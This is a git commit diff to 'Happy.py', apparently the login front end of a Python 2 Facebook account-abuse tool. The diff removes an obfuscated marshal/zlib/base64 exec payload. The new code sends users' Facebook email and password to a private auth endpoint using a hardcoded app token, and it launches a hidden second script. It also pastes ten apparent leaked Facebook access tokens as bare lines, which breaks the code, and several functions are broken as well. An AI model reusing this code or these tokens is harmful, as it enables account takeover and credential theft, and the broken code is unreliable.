49f34b8e1f3823c6107dc7d4334cc8971beec660
Qaiser Abbas <69212320+TechQaiser@users.noreply.github.com>
2020-08-17 16:42:30 +0500

    Update Happy.py

--- Happy.py
+++ Happy.py
@@ -1,6 +1,213 @@
-# Written By Qaiser
-# Youtube : Tech Qaiser
-# Facebook : Qaiser Abbas
+#!/usr/bin/python
+# coding=utf-8
+#Original Written By Tech Qaiser 
+# Source : Python2"
+# donot recode it.
 
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+#Import module
+try:
+    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
+    from multiprocessing.pool import ThreadPool
+    from requests.exceptions import ConnectionError
+    from mechanize import Browser
+except ImportError:
+    os.system('pip2 install requests')
+    os.system('pip2 install mechanize')
+    os.system('python2 Happy.py')
+
+#Browser Setting
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exit():
+	print "[!] Exit"
+	os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+
+
+def hamza(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.03)
+##### LOGO #####
+banner = """
+\033[1;97m╭━━━╮
+\033[1;97m┃╭━╮┃
+\033[1;97m┃┃╱┃┣━━┳┳━━┳━━┳━╮
+\033[1;97m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
+\033[1;97m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
+\033[1;97m╰━━╮┣╯╰┻┻━━┻━━┻╯
+\033[1;97m╱╱╱╰╯
+
+\033[1;97m-----------------------------------------------
+
+\033[1;97mCoder   :\033[1;97mTech Qaiser
+\033[1;97mGithub  :\033[1;97mhttps://github.com/TechQaiser
+\033[1;97mFacebook:\033[1;97mQaiser Abbas
+\033[1;97mYoutube :\033[1;97mTech Qaiser
+\033[1;97mNote :\033[1;97mThis Is only For Educational Purpose
+\033[1;97mNew Update :\033[1;97m Identity Problem Fixed 100% If You Login With Acces Token
+
+\033[1;97m-----------------------------------------------"""
+# titik #
+def tik():
+	titik = [".   ","..  ","... "]
+	for o in titik:
+		print("\r[✔]\033[1;92mLogging In "+o),;sys.stdout.flush();time.sleep(1)
+
+back = 0
+id = []
+
+def tlogin():
+	os.system('clear')
+	print banner
+	username = raw_input("[🔐].\033[1;97mTOOL USERNAME: ")
+	if username =="Qaiser":
+	    os.system('clear')
+	    print banner
+	    print "[✓] .\033[1;92mTOOL USERNAME: "+username+ " (correct)"
+	else:
+	    print "[!] Invalid Username."
+	    time.sleep(1)
+	    tlogin()
+	    
+	passw = raw_input("[🔐] .\033[1;97mTOOL PASSWORD: ")
+	if passw =="Happy":
+	    os.system('clear')
+	    print banner
+	    print "[🔑] \033[1;97mTOOL USERNAME: " +username+ " (correct)"
+	    print "[🔑] \033[1;97mTOOL PASSWORD: " +passw+ "  (correct)"
+	    time.sleep(2)
+	else:
+	    print "[!] Invalid Password."
+	    time.sleep(1)
+	    tlogin()
+	try:
+		toket = open('login.txt','r')
+		os.system('python2 .Happy2.py')
+	except (KeyError,IOError):
+		methodlogin()
+	else:
+		print "\033[1;91m[!] \033[1;91mInvalid Password"
+		time.sleep(1)
+		tlogin()
+
+##### Login Method #####
+
+
+def methodlogin():
+	os.system('clear')
+	print banner
+	print "[-->1<--] \033[1;97mLogin With Email / Password"
+	print "[-->2<--] \033[1;97mLogin Using Fb Token."
+	print "[-->3<--] Get Free Acces Token"
+	print "[-->4<--] \033[1;97mExit."
+	print ('      ')
+	hos = raw_input("\n\033[1;96mChoose Option >>  ")
+	if hos =="":
+		print"\033[1;91m[!] \033[1;95mWrong Input"
+		exit()
+	elif hos =="1":
+		login()
+	elif hos =="2":
+		os.system('clear')
+		print banner
+		hosp = raw_input("Paste Any Token Here For Login: ")
+		tik()
+		hopa = open('login.txt','w')
+		hopa.write(hosp)
+		hopa.close()
+		print "\n\[✓]\033[1;92mLogged In Successfully."
+		time.sleep(1)
+		os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
+		os.system('python2 .Happy2.py')
+	elif hos =="3":
+		print banner
+		
+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
+
+
+		
+	elif hos =="0":
+		exit()
+	else:
+		print"[!]\033[1;91mWrong Input"
+		exit()
+def login():
+	os.system("clear")
+	try:
+		tb=open('login.txt', 'r')
+		os.system("python2 .Happy2.py")
+	except (KeyError,IOError):
+		os.system("clear")
+		print (banner)
+		hamza('\033[1;97mLogin Your Facebook Account')
+		hamza('\033[1;97mNote : Donot Use Your Personal Account Bcoz Of Identity')
+		hamza('\033[1;97m Please Sir Use a New Facebook Account To Login Safely')
+		print'-------------------------------------'
+		iid=raw_input('\033[1;97mNumber/Email = ')
+		id=iid.replace(" ","")
+		pwd=raw_input('\033[1;97m Password = ')
+		tik()
+		data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		z=json.load(data)
+		if 'access_token' in z:
+		    st = open("login.txt", "w")
+		    st.write(z["access_token"])
+		    st.close()
+		    print "\n[✓]\033[1;97mLogged In Successfully."
+		    time.sleep(1)
+		    os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
+		    os.system("clear")
+		    os.system("python2 .Happy2.py")
+		else:
+		    if "www.facebook.com" in z["error_msg"]:
+		        print ('\033[1;91m User Must Verify Account Before Login.')
+		        time.sleep(3)
+		        login()
+		    else:
+		        print ('\033[1;91mEmail / Password Is Wrong ')
+		        time.sleep(1)
+		        login()
+if __name__=='__main__':
+    tlogin()
